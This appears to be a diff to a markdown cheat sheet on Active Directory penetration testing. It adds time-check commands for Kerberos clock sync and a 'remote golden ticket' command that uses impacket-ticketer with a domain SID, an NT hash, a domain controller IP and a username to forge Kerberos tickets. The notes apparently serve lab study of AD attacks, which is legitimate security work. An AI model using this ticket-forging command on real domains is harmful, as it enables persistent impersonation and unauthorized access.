@@ -48,6 +48,11 @@ Users are core of AD and DC's task is to manage access of those users to service
 * to be able to use Kerberos Authentication it is necessary to sync clock with AD domain controller
 
 ```bash
+#check time
+
+tzutil /g
+
+time
 
 sudo apt-get install ntp
 
@@ -746,6 +751,10 @@ compromised password -> https://www.browserling.com/tools/ntlm-hash
 Reference: https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
 ### Golden Ticket
+
+#### remote golden ticket
+
+`impacket-ticketer -domain scorp.com  -domain-sid S-1-5-21-3896762001-1128619745-3071798364 -nthash e1c6184fa33e8450fbd726c147ae0e19 -duration 7 -dc-ip 192.168.219.154 berta_moses`
 
 #### Mimikatz Golden Ticket
 
